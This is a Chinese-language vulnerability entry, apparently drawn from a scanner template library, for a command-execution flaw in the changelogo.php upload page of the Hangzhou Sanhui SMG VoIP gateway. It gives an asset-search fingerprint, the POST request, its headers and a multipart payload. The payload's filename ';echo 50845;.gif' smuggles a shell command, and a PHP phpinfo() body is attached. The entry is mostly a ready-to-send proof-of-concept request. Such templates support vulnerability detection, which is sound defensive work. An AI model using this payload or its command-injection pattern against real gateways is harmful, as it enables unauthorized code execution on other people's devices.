# 杭州三汇SMG网关管理软件changelogo.php命令执行漏洞

- **系统**：杭州三汇SMG网关管理软件changelogo.php　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="text ml10 mr20"`
- **请求**：`POST /changelogo.php HTTP/1.1`
- **关键头**：`Content-Length: 490`　`Content-Type: multipart/form-data; boundary=---------------------------136…`　`Cookie: PHPSESSID=k950j710ilffpu0h8d9ub2m4j6`　`Priority: u=0, i`　`id: sanhui-gateway-changelogo-rce`　`name: sanhui-gateway-changelogo-rce`　`author: unknown`　`severity: high`

**请求体 / payload**
```
-----------------------------136689467536665089023051840895
Content-Disposition: form-data; name="file"; filename=";echo 50845;.gif"
Content-Type: image/gif
<?php
phpinfo();
-----------------------------136689467536665089023051840895
Content-Disposition: form-data; name="OEMContent"
-----------------------------136689467536665089023051840895
Content-Disposition: form-data; name="upload"
Apply
-----------------------------136689467536665089023051840895--
三汇SMG网关管理软件模拟语音网关产品可用于连接传统电话机、传真机和PBX到基于IP的电话网络,SMG模拟网关为IP呼叫中心和多分支机构提供功能强大、稳定可靠和高性价比的VoIP解决方案。 三汇SMG网关管理软件changelogo.php文件中存在命令执行漏洞。
tags: san…（脚本共 1489 字，完整版见原文）
```
- **预期**：200　|　—